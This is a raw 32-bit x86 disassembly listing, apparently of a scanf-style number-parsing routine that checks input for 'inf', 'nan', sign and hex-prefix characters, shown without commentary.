cmp dword [var_f4h], eax
je 0x8072c7c
movzx edx, byte [var_b8h]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
mov byte [var_b6h], 1
mov byte [var_b5h], 1
jmp 0x80727ff
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh_3]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x8072c53
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x8072c53
cmp dword [var_9ch], 0x2d
je 0x8072ce9
cmp dword [var_9ch], 0x2b
jne 0x8072888
mov edx, dword [var_f0h]
cmp dword [var_f4h], edx
jne 0x80727e9
shl dword [var_f0h], 1
mov edx, dword [var_ech]
cmp dword [var_f0h], 0xff
jmp 0x807281e
mov ecx, dword [var_f0h]
cmp dword [var_f4h], ecx
je 0x8072f17
movzx ecx, byte [var_9ch]
mov eax, dword [var_ech]
mov byte [eax], cl
cmp dword [var_9ch], 0xffffffff
mov dword [var_f4h], 1
je 0x8072f00
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072eeb
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8072ed9
inc dword [var_98h]
mov ebx, dword [var_9ch]
mov eax, dword [var_a0h]
mov dword [var_9ch], ebx
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
test eax, eax
mov dword [var_a0h], eax
je 0x8072400
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x78
jne 0x8072400
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8072e95
mov ecx, dword [var_ech]
mov byte [ecx + 1], bl
and dword [var_a4h], 0xffffff7f
mov byte [var_b8h], 0x70
inc ebx
mov dword [var_f4h], 2
mov dword [var_c0h], 1
je 0x8072e81
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072e71
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072e62
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
jmp 0x8072400
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8072e36
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8072e27
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8072e3c
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea edx, [var_1fh_2]
and edx, 0xfffffff0
test eax, eax
mov dword [var_ech], edx
je 0x8072ddb
mov dword [var_8h_3], 1
mov dword [var_4h_3], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x8072ddb
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8072d80
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8072d6d
mov esi, esi
call fcn.08048b20
mov ebx, 0xffffffff
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8072d86
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea edx, [var_1fh]
and edx, 0xfffffff0
test eax, eax
mov dword [var_ech], edx
je 0x8072d28
mov dword [var_8h_2], 0
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x8072d28
mov edx, dword [var_f0h]
cmp dword [var_f4h], edx
je 0x807385b
movzx eax, byte [var_9ch]
mov edx, dword [var_ech]
mov byte [edx], al
mov edx, dword [var_a0h]
mov dword [var_f4h], 1
test edx, edx
je case.0x806fb57.38
cmp dword [var_9ch], 0xffffffff
je 0x8073849
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8073836
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8073824
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x6e
jne case.0x806fb57.38
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
mov dword [var_a0h], eax
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x80737e0
movzx ecx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xec]
mov byte [eax + 1], cl
mov eax, dword [ebp - 0xa0]
mov dword [ebp - 0xf4], 2
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80737cd
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80737bb
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x66
jne case.0x806fb57.38
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x807375d
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je 0x80724f2
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807374b
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8073738
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8073726
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80724f2
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x69
je 0x8073189
mov dword [esp + 4], edx
dec dword [ebp - 0x98]
mov edx, dword [ebp + 8]
mov dword [esp], edx
call fcn.0804e190
jmp 0x80724f2
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x80736c8
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80736b5
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80736a3
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x6e
jne case.0x806fb57.38
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x8073645
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8073632
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8073620
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x69
jne case.0x806fb57.38
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x80735c2
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80735af
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807359d
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x74
jne case.0x806fb57.38
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x807353f
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x807351a
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8073508
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x79
jne case.0x806fb57.38
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x80734b1
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
jmp 0x80724f2
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x807348f
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x807348f
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x807345a
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8073447
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp case.0x806fb57.38
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x80733f0
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x80733f0
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x807339c
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8073389
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x8073332
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x8073332
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80732de
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x80732cb
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x8073274
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x8073274
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8073220
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x807320d
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x80731b6
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x80731b6
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x807314c
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8073139
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp 0x80724f2
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x80730e2
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x80730e2
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x807308e
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x807307b
mov eax, dword [ebp - 0xec]
sub esp, 0x410
mov dword [ebp - 0xf0], 0x100
lea edx, [esp + 0x1f]
and edx, 0xfffffff0
test eax, eax
mov dword [ebp - 0xec], edx
je 0x8073027
mov dword [esp + 8], 1
mov dword [esp + 4], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x8073027
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8072fd3
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8072fc0
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp case.0x806fb57.38
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test eax, eax
mov dword [var_ech], ecx
je 0x8072f6d
mov dword [var_8h_2], 0
mov dword [var_4h_2], eax
mov dword [esp], ecx
call fcn.08053770
jmp 0x8072f6d
mov edx, dword [var_f0h]
cmp dword [var_f4h], edx
je 0x8073a78
movzx eax, byte [var_9ch]
mov edx, dword [var_ech]
mov byte [edx], al
mov ebx, dword [var_a0h]
mov dword [var_f4h], 1
test ebx, ebx
je case.0x806fb57.38
cmp dword [var_9ch], 0xffffffff
je 0x8073849
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8073a65
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8073a53
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x61
jne case.0x806fb57.38
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
mov dword [var_a0h], eax
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8073a0f
movzx ecx, byte [var_9ch]
mov eax, dword [var_ech]
mov byte [eax + 1], cl
mov ecx, dword [var_a0h]
mov dword [var_f4h], 2
test ecx, ecx
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80739ff
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80739f0
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x6e
jmp 0x807347b
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80739ca
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x80739bb
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea edx, [var_1fh_2]
and edx, 0xfffffff0
test eax, eax
mov dword [var_ech], edx
je 0x807396b
mov dword [esp + 8], 1
mov dword [esp + 4], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x807396b
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8073917
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8073904
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test eax, eax
mov dword [var_ech], ecx
je 0x80738b1
mov dword [var_8h_2], 0
mov dword [var_4h_2], eax
mov dword [esp], ecx
call fcn.08053770
jmp 0x80738b1
mov eax, dword [var_a0h]
cmp dword [var_9ch], 0x2d
sete byte [var_b7h]
test eax, eax
je case.0x806fb57.38
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8073cc0
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8073cae
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je case.0x806fb57.38
mov eax, dword [var_9ch]
sub eax, 0x30
cmp eax, 9
jbe 0x8073ca0
mov ecx, dword [var_ach]
movzx eax, byte [var_9ch]
mov edx, dword [ecx + 0x38]
mov eax, dword [edx + eax*4]
cmp eax, 0x69
je 0x8073b98
cmp eax, 0x6e
je 0x8073b98
mov ebx, dword [var_c4h]
mov eax, dword [var_a0h]
mov esi, 0x7fffffff
movzx edx, byte [ebx]
test eax, eax
cmovg esi, dword [var_a0h]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x8073c00
mov ecx, dword [var_c4h]
movzx edx, byte [ecx]
test dl, dl
jne 0x8073bbf
mov edi, dword [var_a0h]
test edi, edi
jle 0x8073bb1
mov ecx, dword [var_ach]
mov dword [var_a0h], esi
mov edx, dword [ecx + 0x38]
mov esi, dword [var_a0h]
test esi, esi
jle 0x80723bc
dec dword [var_a0h]
jmp 0x80723bc
mov eax, dword [var_ach]
mov edx, dword [eax + 0x38]
jmp 0x80723bc
cmp dword [var_9ch], 0xffffffff
je 0x8073bde
movzx eax, byte [var_9ch]
mov ecx, dword [arg_8h]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804e190
cmp ebx, dword [var_c4h]
mov dword [var_a8h], 2
je 0x806f721
dec ebx
movzx eax, byte [ebx]
mov dword [var_9ch], eax
jmp 0x8073bbf
test esi, esi
jle 0x8073b7b
inc ebx
cmp byte [ebx], 0
je 0x8073b7f
cmp dword [var_9ch], 0xffffffff
je 0x8073c91
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8073c81
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8073c72
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je 0x8073c6a
movzx edx, byte [ebx]
dec esi
movzx eax, dl
cmp eax, dword [var_9ch]
jne 0x8073b7b
test esi, esi
jg 0x8073c08
jmp 0x8073b7b
movzx edx, byte [ebx]
jmp 0x8073b7b
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8073c45
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8073c36
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8073c6a
mov eax, dword [var_ach]
mov edx, dword [eax + 0x38]
jmp 0x8073b98
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8073b0a
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8073af7
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x807237f
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x807236c
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8072385
mov dword [var_bch_2], 0
jmp 0x8070d1d
test byte [var_a4h_2], 8
jne 0x806f69c
test byte [var_a4h_2], 2
je 0x8073d75
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8073d61
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov edx, dword [var_98h_2]
mov dword [eax + 4], 0
mov dword [eax], edx
jmp 0x806f69c
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073d4b
add eax, 4
dec edx
jne 0x8073d6d
jmp 0x8073d4b
test byte [var_a4h_2], 4
je 0x8073db9
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8073da5
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov ecx, dword [var_98h_2]
mov word [eax], cx
jmp 0x806f69c
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073d95
add eax, 4
dec edx
jne 0x8073db1
jmp 0x8073d95
test dword [var_a4h_2], 0x200
jne 0x8073dfd
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8073de9
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov edx, dword [var_98h_2]
jmp 0x8073d5a
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073ddc
add eax, 4
dec edx
jne 0x8073df5
jmp 0x8073ddc
mov edi, dword [var_fch_2]
test edi, edi
jne 0x8073e24
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
movzx ecx, byte [var_98h_2]
mov eax, dword [eax]
mov byte [eax], cl
jmp 0x806f69c
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073e14
add eax, 4
dec edx
jne 0x8073e30
jmp 0x8073e14
mov dword [var_bch_2], 8
mov dword [var_c0h], 0
jmp 0x8070d27
and dword [var_a4h_2], 0xfffffff9
mov dword [var_bch_2], 0x10
mov dword [var_c0h_2], 0
mov dword [var_e8h_2], 1
jmp 0x8070d27
test byte [var_a4h_2], 1
jne case.0x806fb57.83
test byte [var_a4h_2], 8
jne 0x8073f04
test dword [var_a4h_2], 0x100
je 0x8074150
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8074135
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov dword [var_dch_2], eax
mov eax, dword [var_dch_2]
test eax, eax
je case.0x806fb57.38
mov dword [var_e0h_2], 0x64
mov dword [esp], 0x64
call fcn.08050fe0
mov ecx, dword [var_dch_2]
mov dword [ecx], eax
mov dword [var_d4h_2], eax
mov edi, dword [var_d4h_2]
test edi, edi
je case.0x806fb57.38
cmp dword [var_9ch_2], 0xffffffff
je 0x807411e
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x807410b
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x80740f9
inc dword [var_98h_2]
mov eax, dword [var_9ch_2]
mov dword [var_9ch_2], eax
inc eax
je 0x806f8c6
mov ecx, dword [var_ach_2]
mov edx, dword [var_9ch_2]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
jne 0x80740d8
test byte [var_a4h_2], 8
jne 0x8073faa
mov ecx, dword [var_d4h_2]
mov byte [ecx], dl
inc ecx
test dword [var_a4h_2], 0x100
mov dword [var_d4h_2], ecx
je 0x8073faa
mov edx, dword [var_dch_2]
mov eax, dword [var_e0h_2]
add eax, dword [edx]
cmp ecx, eax
je 0x807403e
mov esi, dword [var_a0h_2]
test esi, esi
jle 0x8073fc8
dec dword [var_a0h_2]
mov ebx, dword [var_a0h_2]
test ebx, ebx
jle 0x8070814
cmp dword [var_9ch_2], 0xffffffff
je 0x807402c
mov edx, dword [var_4h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x807401c
movzx ecx, byte [eax]
mov edx, dword [var_4h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch_2], ecx
cmp dword [var_9ch_2], 0xffffffff
je 0x807400d
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
jne 0x8073f56
jmp 0x8070814
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8073ffb
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8073fec
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
jmp 0x8070814
mov ebx, dword [var_e0h_2]
add ebx, ebx
mov dword [var_4h], ebx
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d4h_2], eax
je 0x8074085
mov edx, dword [var_d4h_2]
mov eax, dword [var_dch_2]
mov ecx, dword [var_e0h_2]
mov dword [eax], edx
add edx, ecx
mov dword [var_d4h_2], edx
mov dword [var_e0h_2], ebx
jmp 0x8073faa
mov ebx, dword [var_e0h_2]
mov ecx, dword [var_dch_2]
inc ebx
mov dword [var_4h], ebx
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d4h_2], eax
je 0x80740c0
mov ecx, dword [var_e0h_2]
mov edx, dword [var_dch_2]
add dword [var_d4h_2], ecx
